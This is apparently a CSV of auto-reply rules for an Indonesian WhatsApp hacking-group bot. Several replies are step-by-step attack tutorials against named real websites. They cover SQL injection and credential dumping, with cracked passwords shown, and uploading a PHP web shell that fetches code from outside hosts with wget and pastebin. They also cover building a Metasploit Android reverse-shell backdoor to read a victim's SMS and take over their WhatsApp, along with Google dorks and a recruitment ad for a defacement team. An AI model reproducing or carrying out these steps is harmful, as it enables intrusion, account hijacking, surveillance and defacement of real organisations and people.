""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???""","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"assalamualaikum","none","Waalakumsallam","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","none","maintenance","single","","","g","","","","","0","","","","","","","","seconds","0","1"
"sql balitbang","none","cara\n devace web sekolah menggunakan metode Balitbang.. kalian yg punya dendam, benci atau apalah ke sekolah kalian mngkin bisa bisa pke cara ini:V"".. balitbang sendiri ada bnyk ada yg register 3.5.3.. tpi kalaw gw sih pke tools punya nya master gw afrizal:V"".. lngsng aja tutorialnya :\n\n\n1. Termux (download diplaystore)\n\n2. Sc&Shell Backdoor\n\n3. Dork :Â \n\n>intext:""Setup by Website Sekolah Gratis."" Ulangan Site:sch.id\n\ninurl:/member/daftar.php\n>intext:""Setup by cmssekolahku."" cbt site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" rudi site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" guru bahasa site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" firman site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" kenaikan kelas Site:sch.id\n(Kembangin ea biar dpet bnyk)\n\n4. Toolsnya :\nhttps://github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.php\n\n5. Exploit ; http://web.nya/member/listmemberall.php\n\nLangkah awal dorking digoogle kek biasanyaa .. Btw gw sih suka deface web pemerintah ketimbang web sekolah:V""..\n\n\nPilih salah satu target web sekolah yg mau dideface.. kemudian masukan exploitnya /listmemberall.php kalaw vuln blank putih..\n\n\n\n\nKalaw sudah nemu target buka termux dan install dulu toolsnya.. caranya?Â \n\n$git clone https//github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.phpÂ \n\n\nKemudianÂ \n\n$cdÂ balitbang-sqli-post-data\n\nLast\n$php balitbang.php targetkalian\n\n\n\n[+] Data 1 [+]\n\n[+] Username : admin\n\n[+] Password : 5bg848383c1c6c7c4b3c0\n\n[+] End Data [+]\n\n\n[+] Data 2 [+]\n\n[+] Username : gafar\n\n[+] Password : 5bg848383b3bbb9c0b3c5\n\n[+] End Data [+]\n\n\nLah done kan.. terakhir tingggal kita hash passwordnya yg data1.. hashnya private ea bang..","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot tolol","similar","Kau yang tolol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot kontol","similar","Kau yang kontol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot anjeng","similar","Kau yang anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"into out file","none","Hy Sobat ^_^ Udah lama nih ga nge-post lagi :V\n\n\nBerhubung Kemaren ada temen yang rewel banget minta dibuatin Tutorial ini maka disini ane akan menunjukkan bagaimana cara mengunggah shell pada suatu webiste dengan SQL Injection tanpa harus menjadi admin, langsung saja berikut ini adalah langkah - langkahnyaÂ :\n\n\n\n1) Kita cari target yang vuln SQLi dulu, di sini saya sudah mendapatkan 1 target yaitu http://www.vaksindo.co.id/ test target dengan menambahkan tanda ' pada parameter SQL nya ..\n\n\n\n\n2) jika error maka akan muncul tulisan ""Error My SQL bla bla.."" atau sebagian konten ada yang hilang seperti dalam contoh ini ..\n\n\n\n\n\n3) sekarang kita lakukan order by untuk menemukan jumlah table.Â \n\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+1--+&lang=id&p=produk-kami\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+2--+&lang=id&p=produk-kami\nhttp://www.vaksindo.co.id/vaksindo/views.php?page=1&id=1%27+order+by+3--+&lang=id&p=produk-kami\nlakukan hingga error ( Tulisan Hilang ) Kembali\n\n\n4) ternyata di sini trdapat 19 table, selanjutnya kita union+select untuk menemukan table yang bisa di injeksi\n\n\n5) Owh.. ternyata Aksi kita di blok oleh server, kita bisa membypass nya dengan mengganti union menjadi /*!12345union*/\n\n\n6) yaaappss udh ga di blok :D tapi mana? nomer tablenya kok ga muncul? o.O\nhhaha jangan kuatir, untuk memunculkannya tambahkan +and+0 di belakang ID parameter.\n\n\n\n7) nah tuh kita udh dapet nomer nya yaitu 3 , nomer ini lah yang nanti kita gunakan untuk mengeksekusi perintah"" SQLi, sekarang kita cek dulu file_priv nya untuk mengetahui apakah kita bisa mengupload shell atau tidak menggunakan SQLi. Ganti angka 3 tadi dengan file_priv dan tambahkan +from+mysql.user sebelum tanda --+\n\n\n8) yaak kita mendapatkan jawaban Y yang berarti kita bisa mengupload shell melalui SQL Injection :D selanjutnya kita mencoba untuk me-load file /etc/passwd yang ada di server dengan perintah load_file('/etc/passwd') > Letakkan pada angka 3 tadi dan jangan lupa hapus\nstring ""+from+mysql.user"" terlebih dahulu\n\n\nkita dapat :\nroot:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin named:x:25:25:Named:/var/named:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rtkit:x:499:497:RealtimeKit:/proc:/sbin/nologin avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/lib/gdm:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin saslauth:x:498:76:""Saslauthd user"":/var/empty/saslauth:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin pulse:x:497:496:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin dovenull:x:496:493:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin squid:x:23:23::/var/spool/squid:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin admin:x:500:500:administrator:/home/admin:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash ayu:x:502:503::/home/ayu:/bin/bash vaksindo:x:504:505::/var/www/html/vaksindo:/sbin/nologin japfa4kids:x:505:506::/var/www/html/japfa4kids:/sbin/nologin Administrator:x:506:507::/var/www/html/:/sbin/nologin admincorporate:x:507:508::/var/www/html/corporate/:/bin/bash admincatalog:x:508:509::/var/www/html/ecatalog/:/bin/bash\n\n9) di file ini kita bisa mencari folder"" yang sekiranya bisa kita jadikan tempat memasang shell kita. di sini saya menemukan /var/www/html/vaksindo sebagai folder tempat penyimpanan file"" website ini, langkah ini lah yang paling sulit ketika SQLi Into Out File.\n\n\n10) Langkah selanjutnya yakni memasang shell command sederhana yang berisi <?include($_GET[""cmd']);?> namun harus diconvert dahulu menjadi bentuk hex 0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e\ntambahkan hex tersebut pada angka 3 tadi dan tmbahkan string ini sebelum --+\n+INTO+OUTFILE+'directory_web_yang_writable/namashellente.php\n\ncontoh :\n+INTO+OUTFILE+'/var/www/html/vaksindo/foto_berita/pescyte.php'\n\n\n11) Sekarang kita buka shell kita.\n\n\n12) loh kok shellnya cuman angka gitu? o.O hhehee santai, namanya juga shell sederhana, jadi fungsinya di umpetin :v cara memasang shellnya yaitu tambahkan perintah berikut setelah meong.php:\n?cmd=wget alamatshell.txt\ncontoh : ?cmd=wget http://ppsd-files.pe.hu/v2.txt\n\n\n\n13) lalu dilanjutkan dengan perintah :\n?cmd=mv v2.txt anon.php\n\n\n\n\n14) Langkah terakhir, kita buka shell kita yang asli.\n\n\nBinggoooo :D kita sudah berhasil mengupload shell kita :DÂ ","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"pe","none","Lu Islam kagak !","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"rey","none","Ada perlu kalau gak ada skip!","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"sql base64","none","Live target: http://dwf72.go.th/\n\n1. Pertama kalian cari dulu parameter webnya, buat inject\n\nsite:dwf72.go.th inurl:php?id=\n\n2. Buat sql base64 ini kalian butuh apk or tools online buat encode decode base64 nya\n\nhttps://play.google.com/store/apps/details?id=duy.com.text_converter\n\n3. Kalian pilih choose method, lalu klik base64\n\nLalu kalian masukan angka parameternya 184\n\nMaka akan keluar encodenya MTg0==\n\n4. Pada angka 184 kalian kasi '\n\nJadi \n184'\n\nSetelah itu kalian salin hasil encodenya\n\nMTg0Jw==\n\nLalu paste diparam seperti ini\n\nhttp://dwf72.go.th/news.php?id=MTg0Jw==\n\nMaka akan keluar error/vuln\n\n5. Kalian lakukan order by seperti saat sql-i biasa\nTapi encode dalam bentuk base64\n\n184 order by 1 -- -\n\nLalu salin hasil encodenya ke parameternya, sampai error ya\n\n(order by 27) normal\nhttp://dwf72.go.th/news.php?id=MTg0IG9yZGVyIGJ5IDI3IC0tIC0=\n\n(order by 28) error\nhttp://dwf72.go.th/news.php?id=MTg0IG9yZGVyIGJ5IDI4IC0tIC0=\n\nartinya kita cuma menggunakan 1 - 27 saja\n\n6. Kita encode lagi:\n-184 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsMjYsMjcgLS0gLQ==\n\nLalu masukan ks parameter webnya lagi:\n\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsMjYsMjcgLS0gLQ==\n\nDan keluar angka togelnya\n\n7. Lanjut ke tahap dump\n\nKita encode lagi:\n-184 union select 1,2,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLG1ha2Vfc2V0KDYsQDo9MHgwYSwoc2VsZWN0KDEpZnJvbShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyl3aGVyZUA6PW1ha2Vfc2V0KDUxMSxALDB4M2M2YzY5M2UsdGFibGVfbmFtZSxjb2x1bW5fbmFtZSkpLEApLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nLalu kita masukan lagi ke parameternya:\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLG1ha2Vfc2V0KDYsQDo9MHgwYSwoc2VsZWN0KDEpZnJvbShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyl3aGVyZUA6PW1ha2Vfc2V0KDUxMSxALDB4M2M2YzY5M2UsdGFibGVfbmFtZSxjb2x1bW5fbmFtZSkpLEApLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nDan akan muncul tablenya\n\n8. Selanjutnya kita scroll kebawah lalu cari table username & password\n\n9. Lalu kita dump, tapi jangan lupa encode dulu\n\n-184 union select 1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x203a3a20,password,0x3c62723e))))x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 -- -\n\nHasil:\nLTE4NCB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QoQHgpRlJPTShTRUxFQ1QoQHg6PTB4MDApLChTRUxFQ1QoQHgpRlJPTShhZG1pbilXSEVSRShAeClJTihAeDo9Q09OQ0FUKDB4MjAsQHgsdXNlcm5hbWUsMHgyMDNhM2EyMCxwYXNzd29yZCwweDNjNjI3MjNlKSkpKXgpLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nLink:\n\nhttp://dwf72.go.th/news.php?id=LTE4NCB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QoQHgpRlJPTShTRUxFQ1QoQHg6PTB4MDApLChTRUxFQ1QoQHgpRlJPTShhZG1pbilXSEVSRShAeClJTihAeDo9Q09OQ0FUKDB4MjAsQHgsdXNlcm5hbWUsMHgyMDNhM2EyMCxwYXNzd29yZCwweDNjNjI3MjNlKSkpKXgpLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3IC0tIC0=\n\nDan disini maka akan terlihat username passwordnya\n\n10. Lalu kita ambil paling atas\n\nsirinthip :: d01e270f53588fa9dcecd95968fba56374fc85ab\n\nUntuk \nuser : sirinthip\npassword : hash dulu \n\nKita hash\nd01e270f53588fa9dcecd95968fba56374fc85ab\n\nDisini:\nhttps://hashes.com/en/decrypt/hash\n\n11. Lalu kalian salin hasilnya:\nd01e270f53588fa9dcecd95968fba56374fc85ab:puypam\n\nJadi\n\nuser : sirinthip\npassword : puypam\n\n12. Lalu kita cari adlognya dulu\n\nhttp://dwf72.go.th/login\n\nIni adlognya\n\n13. Dan kalian tinggal Login\n\nJika sudah maka akan tampil dasboard admin","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"peringatan","similar","Kalau Rey gak aktif bot pun gak aktif juga harap bisa di maklumi","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"jangan gitu bot","none","Iya maaf","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"telah bergabung menggunakan tautan undangan grup ini","normal","Ketik ""menu"" untuk menampilkan bot grup<#>Semoga betah yang baru masuk grup ^_^","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"kenapa down","none","Gara"" di spam sama member anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"sadap wa","similar","Cara menyadap Whatsapp memakai TERMUX\n\nHello bro, jumpa lagi di bersama omheker. Kali ini omheker akanmembagikan tutorialÂ Cara menyadap Whatsapp memakai TERMUX no root. Jadi postingan ini akan membahas cara yang bisa digunakan untuk melakukanÂ sadap whatsapÂ menggunakan termux.\n\nBanyak aplikasi cara menyadap HP di internet tetapi Pada kesempatan kali ini omheker akan menggunakan Tool Metasploit yang ada pada TERMUX. Tool ini bisa kita manfaatkan untuk mendapatkan remote akses android target.\n\n\nJadi secara singkat, yang akan kami bagikan pada postingan ini adalah menginstal tool Metasploit di termux dan melakukan sadap wa menggunakan Metasploit. Berikut tutorial lengkap nya.\n\nSadap wa menggunakan Metasploit di Termux\n\nBagi yang belum punya aplikasi termux silahkan download dulu diplaystore untuk versi lama. Dan untuk versi terbarunya bisa kalian downloadÂ termux versi lamaÂ \n\n\noke Langsung saja ke tutorialnya. Silahkan ikuti langkah-langkah berikut ini:\n\nLangkah 1: install Metasploit framework di Termux\n\nCara install Metasploit sangat mudah. tetapi size ukuran dari file Metasploit lumayan cukup besar yaitu sekitar 560mb. Sehingga kalian harus siapkan ruang penyimpanan dan kuota yang banyak.\n\n\nUntuk melakukan instalasi Metasploit framework anda bisa menggunakan command perintah berikut di aplikasi termux.\n\nÂ apt update && apt upgrade\n\nÂ pkg install unstable-repo\n\nÂ pkg install metasploit\n\n\nSetelah tool Metasploit berhasil diinstal. Silahkan lanjutkan ke langkah 2.\n\nLangkah 2: MemBuat aplikasi menyadap ( membuat backdoor )\n\nDan Untuk membuat backdoor atau aplikasi sadap whatsapp anda harus menjalankan tool Metasploit nya. Gunakan command perintah berikut ini.\n\nÂ msfconsole\n\nTunggu sampai tampilan nya berubah seperti gambar dibawah ini.\n\n\n\n\n\nSelanjutnya masukkan command berikut dan perhatian penjelasan nya agar tidak terjadi error.\n\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.101Â  LPORT=8080 -o /sdcard/tracker.apk\n\n# LHOST adalah IP address kalian. dan untuk Cara mengecek ip address masuk saja diÂ setting / pengaturanÂ lalu kemdian anda pilihÂ tentang ponselÂ dan cari lagi menuÂ status.\n\n\n\n\n\nJika android kalian tidak support, Silahakan pelajari trik lainya di halamanÂ cara cek ip address.\n\n# LPORT kalian isi saja 8080\n\n# /sdcard/tracker.apk adalah tempat simpan dan nama file (backdoor). Kalian bisa ganti nama file sesuai keinginan. Tapi untuk tempat simpan nya sebaiknya tetap.\n\n\n\nTunggu sampai proses pembuatan aplikasi backdoor nya selesai. Biasanya memakan waktu 3-5 menit.\n\nSetelah semuanya selesai, Langkah selanjutnya anda pergi ke file manager kemudan cari file/aplikasi backdoor sesuai nama yang kalian berikan tadi. lalu kirimkan aplikasi tersebut ke target sadap wa kalian.\n\n\n\n\n\nLangkah 3: Proses penyadapan\n\nSetelah aplikasi backdoor nya dikirimkan. Pastikan korban juga harus menginstal aplikasi tersebut.\n\nLangkah Selanjutnya anda scan/cek apakah aplikasi sudah di install apa belum dengan menggunakan command berikut:\n\n. use multi/handler\n. set payload android/meterpreter/reverse_tcp\n. set lhost 192.168.1.101\n. set lport 4444\n. exploit\n\nMaka hasilnya akan seperti gambar dibawah ini.\n\n\n\n\n\nSetelah itu kalian Tunggu sampai ketika aplikasi backdoor terhubung dengan IP address kamu. Apabila pada tahap ini berlangsung sangat lama. Suruh korban untuk mengklik aplikasi yang sudah diinstall tadi.\n\nDan jika hasilnya sudah menunjukkan seperti gambar diatas. Kita ketikan saja\n\ndump_sms\n\nMaka semua pesan masuk korban akan bisa terbaca oleh kita. Dengan demikian untuk mendapatkan kode verifikasi dari whatsapp sangat lah mudah.\n\nHal terakhir kita hanya perlu melakukan pendaftaran ulang whatsapp menggunakan nomor korban. Dan pada saat harus memasukkan kode konfirmasi kita tinggal ulangi saja semuaÂ langkah 3: proses penyadapan\n\nUntuk lebih jelasnya, simak saja video tutorialnya dibawah ini:","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"push mirror","similar","Bantu push Napa anjeng kagak kesian apa sama team gua :(\n\nhttps://defacer.id/archive/team/grayhat-tersakiti-team","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace rce","similar","DEFACE POC RCE UPLOAD SHELL TERBARU!!\n\n\nAssalamualaikum wr wb.\n\n\n\nYo wassap gaes :V\nMumpung ada kesempatan nge blog di web team wkwkwk btw sibuk w anjg:( .\nKali ini gw SwamGans(GilangKun) mau kasih tutorialÂ Deface Poc RCE !.\n\nSebenernya sih itu method dah lama ya anjg tapi gw coba tadi karna bacaÂ² juga sih di blog temen + dari gogel ternyata masih banyak web yang pulen(vuln) yang ezzz sangat buat di up shell + tebas peler nya xD\n\nUdah ya anjg gk usah banyak bacod:)\nSiapin dulu alat tempur nya xD\n\n-Termux\n-Dork Presh\n-Rokok\n-Face Gans\n-Kuota anjg jan lupa !\n\nOk gan kalo dah siap semua langsung kita ekse ajağŸ˜\n\nPertama kita dorking dulu gan di gogel kalo perluÂ  di deepweb anjg biar proğŸ‘ŠğŸ˜\n\nDork:\nÂ  Â  ~ inurl:/brandUrl=http://\nÂ  Â  ~ inurl:/signin.php?ret=http\nÂ  Â  ~ +""Public"" +""My Conferences"" +""Personal Library"" +""My Profile"" +19.49.5200.0\n\nMasukin dork di atas ke gogel :D\nGk paham? Tolol babi liat gambar di bawah anjg.\n\n\n\nUdah paham kan anjg?\n\nNah kalo dah paham tinggal lu cari web vuln nya xD\nCaranya? Ezzz banget dong pastinya :*\nKita install dulu tools rce nya.\nBuka termux lu asw kalo ga punya donlod sendiri jan manja ! W hek modar lu anjg.\n\nKetik command nya :\n$ pkg update && upgrade\n$ pkg install python\n$ pkg install wget\n$ pkg install bash\n$ git cloneÂ https://github.com/GarudaTersakti72/RCE\n$ ls\n$ cd RCE\n$ sh install.sh\n\nUdah ? Nah kalo udah cara cek web vuln nya kek gini :\n\nKetik : python Rce.py http://sitetarget.com\n\n\n\n\n\nPaham?.\nNah sekarang cara biar tau web itu pulen atau ga gimana? Ezzz kalo udah lu klik enter bakalan ada tulisan pulen/tidak pulen kok xD\nKek gini nih kalo pulen.\n\nTinggal kita up shell deh xD\n\nCaranya? Ketik :\n\n$Â echo '<?php eval(""?>"".file_get_contents(""https://pastebin.com/raw/CurQrH1a"")); ?>' > sel.php\n\nNah kalo bisa ke upload shell nya kek gini nih liat gambar anjg jan liat bokep.\n\n\nBakalan ada tulisan No Output.\n\nCara akses nya? Ezz sangatz http://sitetarget.com/scripts/namashellu.php\n\n\nJederrr memexxxx ke upload kan? XD\n\nTerserah mau lu tebas index atau ngga :)","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"ompem ght","similar","https://chat.whatsapp.com/EFDaJ4xmtPc2IW1JRyQE0O\n\n*Assalamualaikum G.H.T open member*\n\nâ€¢ DEFACER\n- devace 3 poc\n- 4 miror\n\nâ€¢ BUG HUNTER\n-SQLI\n-XSS\n\nâ€¢ CTF \n- forensic\n- cryptography\n- web\n\n*(Pilih salah satu)*\n\n\nMinat?\nHUB :\n\n*DEFACER*\nREY \nWa.me/6289513286355\n\n*CTF*\nStephen\nWa.me/62088233973151\n\n*BUG HUNTER*\nMr.Xploit 13\nWa.me/6281296227727\n\n#izin share","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"opmem ght","similar","https://chat.whatsapp.com/EFDaJ4xmtPc2IW1JRyQE0O\n\n*Assalamualaikum G.H.T open member*\n\nâ€¢ DEFACER\n- devace 3 poc\n- 4 miror\n\nâ€¢ BUG HUNTER\n-SQLI\n-XSS\n\nâ€¢ CTF \n- forensic\n- cryptography\n- web\n\n*(Pilih salah satu)*\n\n\nMinat?\nHUB :\n\n*DEFACER*\nREY \nWa.me/6289513286355\n\n*CTF*\nStephen\nWa.me/62088233973151\n\n*BUG HUNTER*\nMr.Xploit 13\nWa.me/6281296227727\n\n#izin share","single","","","b","","","","","0","","","","","","","","seconds","0","0"
